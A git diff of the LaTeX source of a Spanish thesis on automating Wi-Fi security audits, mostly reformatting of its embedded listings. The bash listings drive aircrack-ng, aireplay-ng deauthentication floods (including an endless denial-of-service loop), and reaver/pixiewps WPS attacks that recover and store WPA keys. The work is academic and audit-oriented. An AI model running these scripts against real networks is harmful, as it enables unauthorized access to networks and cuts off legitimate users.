@@ -155,10 +155,10 @@ $\ $
 
 ~\vfill
 
-%\noindent Copyright \copyright\ \\ % Copyright notice
+\noindent Copyright \copyright\ \\ % Copyright notice
 \doublespace\noindent\textsc{\thetitle}
 
-%\noindent \textsc{https://github.com/zooiberg/tfg/tree/master/memoria}\\ % URL
+\noindent \textit{https://github.com/zooiberg/tfg/tree/master/memoria}\\ % URL
 
 \noindent Memoria realizada durante el Trabajo Final de Carrera del alumno Luis Ramírez de Diego en el año lectivo 2015/2016 y supervisado por el profesor y tutor del proyecto, Francisco Moya Fernandez\\ % License information
 
@@ -812,16 +812,15 @@ ListarTarjetasWifi() {
     N_TARJETAS_WIFI=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}'`
     if [ "$TARJETAS_WIFI_DISPONIBLES" = "" ]
     then
-	
-	exit 1
+    exit 1
     else
-	let x=1
-	while [ $x -le $N_TARJETAS_WIFI ]
-	do
-		INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
-		DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`
-		echo '<item>'$INTERFAZ' '$DRIVER'</item>'
-		x=$((x+1))
+       let x=1
+       while [ $x -le $N_TARJETAS_WIFI ]
+       do
+	INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
+	DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`
+	echo '<item>'$INTERFAZ' '$DRIVER'</item>'
+	x=$((x+1))
 	done
     fi
     echo "</comboboxtext>"
@@ -844,24 +843,24 @@ A continuación se muestra el método que se encarga de activar el modo monitor de
 \begin{lstlisting}	[label=prueba1,caption=Activar Modo Monitor]
 ActivarModoMonitor(){
   TARJETA_SELECCIONADA=`echo $TARJETA_SELECCIONADA | awk {' print $1 '}`
-    echo $TARJETA_SELECCIONADA > $ARCHIVO_TARJETA_SELECCIONADA
+  echo $TARJETA_SELECCIONADA > $ARCHIVO_TARJETA_SELECCIONADA
   if ! CheckInterface ;
   then 
-    return 1;
+   return 1;
   fi
-    echo "RESETEANDO INTERFACE" > "$ARCHIVO_STATUSBAR"
+  echo "RESETEANDO INTERFACE" > "$ARCHIVO_STATUSBAR"
   if ! ResetInterface ; 
   then return 1;
   fi
-    echo "DESLIGANDO INTERFACE DE NETWORKMANAGER" > "$ARCHIVO_STATUSBAR"
+  echo "DESLIGANDO INTERFACE DE NETWORKMANAGER" > "$ARCHIVO_STATUSBAR"
   if ! DeshabilitarNetworkManager ON ; 
   then 
     return 1;
   fi 
-    echo "ACTIVANDO MODO MONITOR" > "$ARCHIVO_STATUSBAR"  
-    airmon-ng start $TARJETA_SELECCIONADA &> $ARCHIVO_LOG
-    TARJETA_MODO_MONITOR=(`iwconfig 2>/dev/null | grep Mode:Monitor | awk {'print $1?}`)
-    echo "$(iwconfig $TARJETA_MODO_MONITOR)" >> "$LOG_AIRMONG"
+  echo "ACTIVANDO MODO MONITOR" > "$ARCHIVO_STATUSBAR"  
+  airmon-ng start $TARJETA_SELECCIONADA &> $ARCHIVO_LOG
+  TARJETA_MODO_MONITOR=(`iwconfig 2>/dev/null | grep Mode:Monitor | awk {'print $1?}`)
+  echo "$(iwconfig $TARJETA_MODO_MONITOR)" >> "$LOG_AIRMONG"
   if [ ! $TARJETA_MODO_MONITOR ]
   then 
     echo "ERROR: No se pudo activar el modo monitor en $TARJETA_SELECCIONADA" >
@@ -872,7 +871,7 @@ ActivarModoMonitor(){
     echo "Modo monitor activado en $TARJETA_MODO_MONITOR" > $ARCHIVO_STATUSBAR
     echo $TARJETA_MODO_MONITOR > $ARCHIVO_TARJETA_MONITOR
     echo "0" > $ARCHIVO_LOG
-  fi
+ fi
 }
 
 \end{lstlisting}
@@ -888,17 +887,14 @@ ActivarModoMonitor(){
 A continuación se muestra el método encargado de buscar las posibles redes inalámbricas en la zona:
 
 
-\begin{lstlisting}	[label=prueba2,caption=Escanear redes]
+\begin{lstlisting}	[label=prueba12,caption=Escanear redes]
 ScanearRedes() {
     rm -f "$RUTA_LOGS"CAP* > /dev/null
     rm -f "$ARCHIVO_REDES_SCAN" &> /dev/null && touch $ARCHIVO_REDES_SCAN 
-    
     TARJETA_SELECCIONADA=`cat $ARCHIVO_TARJETA_SELECCIONADA` 
     TARJETA_MODO_MONITOR=`cat $ARCHIVO_TARJETA_MONITOR` 
     ifconfig $TARJETA_SELECCIONADA up &> /dev/null
-    
     (airodump-ng "$TARJETA_MODO_MONITOR" -a -w "$ARCHIVO_CAPTURAS" &>/dev/null &)
-    
     for A in `seq 1 $TIEMPO_SCANEO` ; 
     do
       sleep 1s
@@ -947,34 +943,32 @@ ListarTarjetasWifi() {
     let CUANTAS=`echo $INTERFACES_MONITOR | wc -w`
     let CONT=1
     while [ $CONT -le $CUANTAS ]
-  do
+    do
         MON=`echo $INTERFACES_MONITOR | awk '{print $'$CONT'}'` 
         airmon-ng stop $MON > /dev/null 2>&1
         let CONT=$CONT+1
-  done
-    
+    done
     echo '<comboboxtext active="0" button-sensitivity="1">'
     echo '<variable>TARJETA_SELECCIONADA</variable>'
     TARJETAS_WIFI_DISPONIBLES=`iwconfig --version | grep "Recommend" | awk '{print $1}' | sort`
     echo "$(iwconfig)" >> "$LOG_TARJETA_WIFI"
     N_TARJETAS_WIFI=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}'`
-    
     if [ "$TARJETAS_WIFI_DISPONIBLES" = "" ]
     then
-	exit 1
+      exit 1
     else
-	let x=1
-	while [ $x -le $N_TARJETAS_WIFI ]
-	do
-		INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
-		DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\	([a-zA-Z0-9_-]*\)$/\1/'`
-		echo '<item>'$INTERFAZ' '$DRIVER'</item>'
-		x=$((x+1))
-	done
+      let x=1
+      while [ $x -le $N_TARJETAS_WIFI ]
+      do
+	INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
+	DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\	([a-zA-Z0-9_-]*\)$/\1/'`
+	echo '<item>'$INTERFAZ' '$DRIVER'</item>'
+	x=$((x+1))
+      done
     fi
-   echo "</comboboxtext>"
-   unset INTERFACES_MONITOR CONT CUANTAS MON TARJETAS_WIFI_DISPONIBLES
-   N_TARJETAS_WIFI INTERFAZ DRIVER x
+    echo "</comboboxtext>"
+    unset INTERFACES_MONITOR CONT CUANTAS MON TARJETAS_WIFI_DISPONIBLES
+    N_TARJETAS_WIFI INTERFAZ DRIVER x
 }
 \end{lstlisting}
 
@@ -1040,41 +1034,36 @@ AircrackWEP() {
 
 	if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
 	then
-		#Utilizo mi propia interfaz para realizar falsa autenticación
-		TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
+	     #Utilizo mi propia interfaz para realizar falsa autenticación
+	     TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
 	else
-		TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+	     TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
 	fi
 
 	TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
 	sudo airmon-ng stop $TARJETA_MODO_MONITOR
-
 	TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk '{print $1}' | sort)	
 	INTERFAZ=$(echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $1}')
 	sudo airmon-ng start $INTERFAZ $CANAL
 	X1="airmon-ng start $INTERFAZ $CANAL"
-	
 	airodump-ng -c $CANAL --bssid $BSSID -w $CAPTURA_AIRCRACK $TARJETA_MODO_MONITOR
 	X2="airodump-ng -c $CANAL --bssid $BSSID -w output $TARJETA_MODO_MONITOR"
-
 	echo "....Comienzo a inyectar..."
-
 	aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
 	X3="aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
 	aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
 	X4="aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
-	
 	TIEMPO_ESCANEO="120"
 	for A in `seq 1 $TIEMPO_ESCANEO` 
 	do
-		sleep 1s
-		if [ $A -eq $TIEMPO_ESCANEO ]
-		then
-			X5="aircrack-ng -a 1 -s output-01.cap"
-			sudo aircrack-ng -a 1 -s "$CAPTURA_AIRCRACK-01.cap" >> "$RUTA_AIRCRACK/aircrack-$BSSID.dat" &
-		else
-			TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
-		fi
+	      sleep 1s
+	      if [ $A -eq $TIEMPO_ESCANEO ]
+	      then
+		X5="aircrack-ng -a 1 -s output-01.cap"
+		sudo aircrack-ng -a 1 -s "$CAPTURA_AIRCRACK-01.cap" >> "$RUTA_AIRCRACK/aircrack-$BSSID.dat" &
+	      else
+		TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
+               fi
 	done
 	EsperarAcabarAircrack 10
 	X6=`cat "aircrack-$BSSID.dat" | grep "WEP" | awk -F '(' '{print $2}' | awk -F 'IVs' '{print $1}'`
@@ -1082,20 +1071,19 @@ AircrackWEP() {
 	X7="SI"
 	if [ ! `echo "aircrack-$BSSID.dat" | grep "KEY FOUND"`  ]
 	then
-		X7="NO"
+	        X7="NO"
 	fi
 	X9="aircrack-$BSSID.dat"
 
 	(`sudo python "$RUTA_INFORME/SECWEP1.py" $BSSID "$ESSID" $CANAL $TARJETA_SELECCIONADA_MAC`)
 	(`sudo python "$RUTA_INFORME/SUBSWEP1.py" "$X1" "$X2" "$X3" "$X4" "$X5" "$X6" "$X7" "$X8" "$X9"`)
-
 	unset A, X1, X2, X3, X4, X5, X6, X7, X8, X9, BSSID, CANAL, ESSID
 }
 \end{lstlisting}
 
 \subsubsection{Denegación de servicios.}
 El objetivo de este ataque es dejar a los usuarios legítimos de una red Wi-Fi sin poder acceder a internet. Por lo tanto, se inunda con paquetes de desautenticación al punto de acceso o al cliente que decida.
-Como siempre, la tarjeta inalámbrica debe estar en modo monitor y escuchando en el canal específico. Así se desautenticará en un bucle infinito (-0 0) al cliente o al punto de acceso que se seleccione.
+Como siempre, la tarjeta inalámbrica debe estar en modo monitor y escuchando en el canal específico. Así se desautenticará en un bucle infinito  al cliente o al punto de acceso que se seleccione.
 
 \begin{lstlisting}	[label=prueba4,caption=Denegación de servicios]
 DenegacionServicio (){
@@ -1119,16 +1107,16 @@ DenegacionServicio (){
      X3="aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
      aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
      TIEMPO_ESCANEO="120"
-  for A in `seq 1 $TIEMPO_ESCANEO` 
-    do
-        sleep 1s
+     for A in `seq 1 $TIEMPO_ESCANEO` 
+        do
+         sleep 1s
            if [ $A -eq $TIEMPO_ESCANEO ]
            then
                 sudo killall xterm
            else
                 TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
            fi
-    done
+        done
     #Comprobar la DOS
     (sudo python "$RUTA_INFORME/SUBSDOS.py" "$X1" "$X2" "$X3" "$X4")
     sudo airmon-ng stop $TARJETA_MODO_MONITOR
@@ -1151,14 +1139,10 @@ Atacarreaver(){
   TARJETA_MODO_MONITOR=`cat $ARCHIVO_TARJETA_MONITOR` 
   ifconfig $TARJETA_SELECCIONADA up &> /dev/null
   ATAQUE_DETENIDO="NO"
-
   (`sudo python "$RUTA_INFORME/SECWPA1.py" $BSSID "$ESSID" $CANAL $TARJETA_MODO_MONITOR`)
-
   echo "ATACANDO BSSID $BSSID EN CANAL $CANAL" > $ARCHIVO_STATUSBAR
-
   X1="reaver_pixie -F -G -i $TARJETA_MODO_MONITOR -b $BSSID -c $CANAL -a -n -vv -D"
   reaver_pixie -F -G -i $TARJETA_MODO_MONITOR -b $BSSID -c $CANAL -a -n -vv -D > $ARCHIVO_TXT_ATAQUE 2> /dev/null
-
   if ! EsperarAcabarReaver 
   then
     if [ $AUTOMATICO = 0 ]
@@ -1201,24 +1185,20 @@ Atacarreaver(){
     if [ $ACTUALIZAR_SCAN = "SI" ]; 
     then ProcesarDatosEscaneoAirodump; 
     fi
-
-	#Infome Latex SECWPA1-Template.tex
-	X2="NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID"
-	X3="..LOGS\TXT_ATAQUE"
-	X4="FIN-Template"
-	(`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3" "$X4"`)
-
+    #Infome Latex SECWPA1-Template.tex
+    X2="NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID"
+    X3="..LOGS\TXT_ATAQUE"
+    X4="FIN-Template"
+    (`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3" "$X4"`)
     echo "1" > $ARCHIVO_LOG
     return
   fi
   echo "PROBANDO CON PIXIEWPS 1.0 by wiire" > $ARCHIVO_STATUSBAR
-  
   #Infome Latex SECWPA1-Template.tex
   X2="Se ha obtenido la informaciÛn requerida"
   X3="pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee"
   X4="PIXIEWPS"
   (`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3" "$X4"`)
-  
   pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee &>> $ARCHIVO_TXT_ATAQUE
   AnalizarLogPixiewps
   echo "1" > $ARCHIVO_LOG
@@ -1229,14 +1209,14 @@ Atacarreaver(){
 \paragraph{Pixiewps:}
 Este ataque \textit{Pixiewps} es también conocido como \textit{polvo mágico}. Lo primero que hará es comprobar si el router al que se le realiza el ataque es vulnerable. Si así lo fuera, se podrá obtener la clave en segundos. Continuando los pasos de los ataques anteriores y utilizando la tarjeta en modo monitor y escaneando el tráfico, se atacará a una de las redes disponibles que disponga de WPS activado. Primero utilizaremos el comando \textit{reaver} para recoger la PKE (clave pública de la persona inscrita), PKR (clave pública del registrador),e-hash 1 (hash  de la primera mitad del PIN WPS, fuerza bruta) y E-2 de hash (hash  de la segunda mitad del PIN WPS, fuerza bruta), E-nonce/ R-nonce y la authkey. Una vez se obtenga toda la información, se podrá aplicar pixiewps, para reducir tiempos.
 
-\begin{lstlisting}	[label=prueba7,caption=PixieWPS]
+\begin{lstlisting}	[label=prueba17,caption=PixieWPS]
 AnalizarLogPixiewps(){
   lineas_log=$(cat $ARCHIVO_TXT_ATAQUE | wc -l | awk {' print$1 '})
   for A in `seq 1 $lineas_log` ; 
- do 
-    linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
-  if [[ $linea == *"WPS pin"* ]] 
-  then 
+  do 
+     linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
+   if [[ $linea == *"WPS pin"* ]] 
+   then 
       if [[ $linea == *"not found"* ]]
       then 
 	echo "$BSSID : ATAQUE FALLIDO, BSSID NO VULNERABLE A PIXIEWPS ATTACK" >$ARCHIVO_STATUSBAR
@@ -1248,13 +1228,9 @@ AnalizarLogPixiewps(){
 	return 1
       fi
     PIN_WPS=`echo $linea | awk -F":" {' print $2 '} `
-   
     echo "$BSSID : PIN WPS CONSEGUIDO, RECUPERANDO CLAVE WPA, ESPERA ..." >$ARCHIVO_STATUSBAR
-
     X13="reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS"
-
     reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS &>>$ARCHIVO_TXT_ATAQUE
-
     let vez=2
     if EsperarAcabarReaver
     then
@@ -1266,7 +1242,6 @@ AnalizarLogPixiewps(){
     else
       CLAVE_WPA="NO SE HA PODIDO RECUPERAR LA CLAVE WPA"
     fi
-    
     echo $fabricante > $ARCHIVO_TXT_ATAQUE
     echo $modelo >> $ARCHIVO_TXT_ATAQUE
     echo $numero_de_modelo >> $ARCHIVO_TXT_ATAQUE
@@ -1286,36 +1261,34 @@ AnalizarLogPixiewps(){
     echo "- BSSID : "$BSSID  >> $CARPETA_KEYS"$ESSID.DATOS"
     echo "- PIN WPS : "$PIN_WPS >> $CARPETA_KEYS"$ESSID.DATOS"
     echo "- KEY WPA : "$CLAVE_WPA >> $CARPETA_KEYS"$ESSID.DATOS"
-    
+
     fabricante=$(echo $fabricante | awk -F":" {' print $2 '})
     modelo=$(echo $modelo | awk -F":" {' print $2 '})
     numero_de_modelo=$(echo $numero_de_modelo | awk -F":" {' print $2 '})
     numero_de_serie=$(echo $numero_de_serie | awk -F":" {' print $2 '})
     device_name=$(echo $device_name | awk -F":" {' print $2 '})
-
     #Inicio Infome Latex PIXIEWPS-Template.tex
     X1="pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee"
     X2=$PIN_WPS
     X3="reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS"
     X4=$CARPETA_KEYS"$ESSID.DATOS"
-    (`sudo python "$RUTA_INFORME/PIXIEWPS.py" "$X1" $Pke $PKr $EHash1 $EHash2 
-	$AuthKey $Enrollee $X2 "$X3" "$X4"`)
+    (`sudo python "$RUTA_INFORME/PIXIEWPS.py" "$X1" $Pke $PKr $EHash1 $EHash2\ 
+										$AuthKey $Enrollee $X2 "$X3" "$X4"`)
     #Fin Latex
-    
     if ! grep -q $BSSID $ARCHIVO_DATABASE_KEYS
     then
         if [ "$CLAVE_WPA" = "NO SE HA PODIDO RECUPERAR LA CLAVE WPA" ];
         then CLAVE_WPA="?"; 
         fi 
-	 echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|"$numero_de_serie"|"
-	 $device_name >> $ARCHIVO_DATABASE_KEYS
+        echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|"$numero_de_serie"|"\
+	 	$device_name >> $ARCHIVO_DATABASE_KEYS
     else
 	if [ $(grep $BSSID $ARCHIVO_DATABASE_KEYS | awk -F"|" {'print $4'}) = "?" ] && [ $CLAVE_WPA != "?" ] 
 	then
 	  sed '/'$BSSID'/d' $ARCHIVO_DATABASE_KEYS | sed '/^$/d' > TEMPORAL
 	  mv TEMPORAL $ARCHIVO_DATABASE_KEYS
-	  echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|"
-	  $numero_de_serie"|"$device_name >> $ARCHIVO_DATABASE_KEYS
+	  echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|"\
+	  	  $numero_de_serie"|"$device_name >> $ARCHIVO_DATABASE_KEYS
 	fi
     fi    
     echo "$BSSID : ATAQUE FINALIZADO, SE HA GENERADO EL ARCHIVO $ESSID.DATOS" > $ARCHIVO_STATUSBAR
@@ -1325,19 +1298,19 @@ AnalizarLogPixiewps(){
     then ProcesarDatosScaneo;
     fi
   fi 
-done
-unset lineas_log A linea PIN_WPS CLAVE_WPA fabricante modelo numero_de_modelo numero_de_serie device_name  
+ done
+ unset lineas_log A linea PIN_WPS CLAVE_WPA fabricante modelo numero_de_modelo numero_de_serie device_name  
 }
 
 RecuperarClaveWpa() {
   lineas_log=$(cat $ARCHIVO_TXT_ATAQUE | wc -l | awk {' print$1 '})
   let A=0
   for A in `seq 1 $lineas_log` ; do 
-    linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
+   linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
     if [[ $linea == *"WPA PSK"* ]] 
     then 
-      CLAVE_WPA=`echo $linea | awk -F":" {' print $2 '}` 
-      CLAVE_WPA=`echo $CLAVE_WPA | awk -F"'" {' print $2 '}`
+     CLAVE_WPA=`echo $linea | awk -F":" {' print $2 '}` 
+     CLAVE_WPA=`echo $CLAVE_WPA | awk -F"'" {' print $2 '}`
     fi
   done
 }
@@ -1362,10 +1335,10 @@ AircrackWPA() {
     CLIENT=$(cat $ARCHIVO_CAPTURAS-clients.csv | grep $BSSID)
     TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
     if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]; then
-          #Utilizo mi propia interfaz para realizar falsa autenticacion
-          TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
+        #Utilizo mi propia interfaz para realizar falsa autenticacion
+        TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
     else
-          TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+        TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
     fi
     TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
     sudo airmon-ng stop $TARJETA_MODO_MONITOR
@@ -1399,7 +1372,6 @@ AircrackWPA() {
     	X6="NO"
     fi
     X7="aircrack-$BSSID.dat"
-
     (`sudo python "$RUTA_INFORME/SUBSWPA2.py" "$X1" "$X2" "$X3" "$X4" "$X5" "$X6" "$X7"`)
     unset A, X1, X2, X3, X4, X5, X6, X7, BSSID, CANAL, ESSID
 }
@@ -1454,7 +1426,7 @@ AnalizarPyrit() {
 Partiendo de un lenguaje de programación desde el cual se ha desarrollado el código para automatizar el dispositivo, se contará con otro lenguaje de programación (\textit{Python}) para que interactue, y por medio de una de sus bibliotecas \textit{Jinja2}, genere unas plantillas (templates) donde se irán introduciendo los datos variables. Como se muestra en el gráfico, una vez obtengamos el informeWEP.tex o informeWPA.tex dependiendo del protocolo de la red, se utilizara la aplicación \textit{pdflatex} para generar el informe final.pdf.
 \begin{figure}[H]
   \centering
-   \includegraphics[width=1\textwidth]{informe.png}
+   \includegraphics[width=0.6\textwidth]{informe.png}
   \caption{Pasos a seguir para generar el informe.}
   \label{fig:esquema3}
 \end{figure} 
@@ -1482,8 +1454,8 @@ CrearInformeWEP() {
 }
 \end{lstlisting}
 
-\begin{itemize}
-	\item SECWEP1.py :
+
+\subsection{SECWEP1.py} 
 	Este apartado mostrará las cuatro variables básicas de una red WEP. A continuación se observa el archivo \textit{python} para facilitar el entendimiento, se aprecia que se ha empleado la biblioteca \textit{jinja}, mostrando en la linea 17 cual será la estructura que se empleará (Template). En la linea 18 se puede observar la salida con la información ya en el INF-WEP.tex y las  variables que se introducirán.  
 
 \begin{lstlisting}[language=Python,label=informeWEP,caption=Sección WEP.py]
@@ -1510,65 +1482,88 @@ output.close()
 }
 \end{lstlisting}
 
-		\begin{itemize}
-		\item SECWEP1-Template.tex
-		
+\subsubsection{SECWEP1-Template.tex}	
 		  \lstinputlisting[language={[LaTeX]TeX},label=informeWEP1,caption=Sección WEP-Template] {SECWEP1-Template.tex.txt}
 		
-		\item INF-WEP1.tex
+\subsubsection{INF-WEP1.tex}
 		
 		  \lstinputlisting[language={[LaTeX]TeX},label=informeWEP2,caption=Sección WEP.tex] {INF-WEP.tex.txt}
 		
-		\end{itemize}
-		
-	\item SUBSDOS.py:
+\subsection{SUBSDOS.py}
 	Este sección, es la encargada de recoger toda la información cuando se realiza el ataque de Denegación de Servicios. Al igual que en el apartado anterior, el programa en \textit{python}  utiliza la biblioteca previamente importada, \textit{jinja2}. Será el mismo procedimiento, llamando al Template para generar el INF-SUBSDOS.tex.
 	
 	
 	Esta sección se utilizará tanto para el protocolo WEP como para el WPA/WPA2.
 	
-		\lstinputlisting[language=Python] {SUBSDOS.py.txt}
-	
-		\begin{itemize}
+\begin{lstlisting}[language=Python,label=informedds,caption=Sección Denegación de Servicios.py]		
+import jinja2
+import sys, os
+from jinja2 import Template
+latex_jinja_env = jinja2.Environment(
+        block_start_string = '\BLOCK{',
+        block_end_string = '}',
+        variable_start_string = '\VAR{',
+        variable_end_string = '}',
+        comment_start_string = '\#{',
+        comment_end_string = '}',
+        line_statement_prefix = '%%',
+        line_comment_prefix = '%#',
+        trim_blocks = True,
+        autoescape = False,
+        loader = jinja2.FileSystemLoader(os.path.abspath('.'))
+)
+template = latex_jinja_env.get_template('INFORME/SUBSDOS-Template.tex')
+output = file('INFORME/INF-SUBSDOS.tex', 'w')
+output.write(template.render(x1=sys.argv[1],x2=sys.argv[2],x3=sys.argv[3],x4=sys.argv[4]).encode("iso-8859-1"))
+output.close()
+\end{lstlisting}
+
+				
+\subsubsection{SUBSDOS-Template.tex}
 		
-		\item SUBSDOS-Template.tex
+\lstinputlisting[language={[LaTeX]TeX},
+                       label=SUBSDOS-Template.tex,
+                       caption=SUBSDOS-Template.tex]{SUBSDOS-Template.tex.txt}
 		
-		\lstinputlisting[language={[LaTeX]TeX}] {SUBSDOS-Template.tex.txt}
+\subsubsection{INF-SUBSDOS.tex}
 		
-		\item INF-SUBSDOS.tex
+\lstinputlisting[language={[LaTeX]TeX},
+		      label=INF-SUBSDOS.tex,
+                       caption=INF-SUBSDOS.tex] {INF-SUBSDOS.tex.txt}
 		
-		\lstinputlisting[language={[LaTeX]TeX}] {INF-SUBSDOS.tex.txt}
-		\end{itemize}
 		
-	\item SUBSWEP1.py	:
+\subsection{SUBSWEP1.py}
 	Por último, se obtendrá toda la información necesaria a la hora de generar el informe automatizado, tras un ataque a una red con cifrado WEP. Los pasos que se han seguido son exactamente los mismos que las secciones anteriores.
 	
-		\lstinputlisting[language=Python] {SUBSWEP1.py.txt}
+\lstinputlisting[language=Python,
+		     label=informewp1,
+		     caption=Sección WEP1] {SUBSWEP1.py.txt}
+			
+\subsubsection{SUBSWEP1-Template.tex}
+
+\lstinputlisting[language={[LaTeX]TeX},
+		      label=SUBSWEP1-Template,
+                       caption=SUBSWEP1-Template.tex] {SUBSWEP1-Template.tex.txt}
 		
-		\begin{itemize}
 		
-		\item SUBSWEP1-Template.tex
-		\lstinputlisting[language={[LaTeX]TeX}] {SUBSWEP1-Template.tex.txt}
-		
-		
-		\item INF-SUBSWEP1.tex
+\subsubsection{INF-SUBSWEP1.tex}
 
                   \lstinputlisting[%
                     language={[LaTeX]TeX},
                     label=INF-SUBWEP1,
                     caption=INF-SUBWEP1.tex] {INF-SUBSWEP1.tex.txt}
-		
-		
-	\end{itemize}
-\end{itemize}
-
-CrearInformeWEP()
-\lstinputlisting {CrearInformeWEP().txt}
+\paragraph{Generar informe WEP.}		
+  \lstinputlisting[%
+                    language={[LaTeX]TeX},
+                    label=CrearInformeWEP(),
+                    caption=CrearInformeWEP()] {CrearInformeWEP().txt}
 
 \paragraph{Generar informe WPA.}
 
-CrearInformeWPA()
-\lstinputlisting {CrearInformeWPA().txt}
+ \lstinputlisting[%
+                    language={[LaTeX]TeX},
+                    label=CrearInformeWPA(),
+                    caption=CrearInformeWPA()] {CrearInformeWPA().txt}
 
 \begin{figure}[H]
   \centering
@@ -1577,11 +1572,7 @@ CrearInformeWPA()
   \label{fig:i}
 \end{figure} 
 Como en el caso anterior, el informe WPA se puede desglosar en varias secciones que generan un único informe.
-Se utilizan los mismo programas y el mismo lenguaje de programación por lo que no se volverá a explicar de nuevo, pudiendo leerlo en el ANEXO D, si fuera necesario.
-
-
-
-
+Se utilizan los mismo programas y el mismo lenguaje de programación por lo que no se volverá a explicar de nuevo, pudiendo leerlo en el ANEXO C, si fuera necesario.
 
 
 %%%%%%%%%%%%%%CONCLUSION %%%%%%%%%%
@@ -1622,7 +1613,8 @@ Estas medidas no harán que su red sea invulnerable a cualquier ataque, pues eso 
 %\includepdf[pages=-]{informe-WPA}
 
 \chapter{Código}\label{anexo.C}
-
+%\lstinputlisting[label=INF-SUBSDOS.tex,
+   %                    caption=INF-SUBSDOS.tex] {SeguridadWifi}
 \cleardoublepage
 %%BiBLIOGRAFIA%%
 %\addcontentsline{toc}{chapter}{Bibliografía}
@@ -1631,7 +1623,7 @@ Estas medidas no harán que su red sea invulnerable a cualquier ataque, pues eso 
 
 \begin{thebibliography}{X}
 
-\bibitem{ipyme} \textsc{Fundetec y el ONTSI. (2012), Urueña, Alberto., P. Ballestero., María. Valdecasa, Elena.}  \textsc{Recuperado de \url{http://www.ipyme.org/Publicaciones/informe-epyme-2012.pdf}},\textit{Análisis sectorial de implantación de las TIC en la pyme española.}
+\bibitem{ipyme} \textsc{Fundetec y el ONTSI. (2012), Urueña, Alberto., P. Ballestero., María. Valdecasa, Elena.}  \textsc{Recuperado de \url{http://www.ipyme.org/Publicaciones/informe-epyme-2012.pdf}}, \textit{Análisis sectorial de implantación de las TIC en la pyme española.}
 España 2012, pag 105.
 
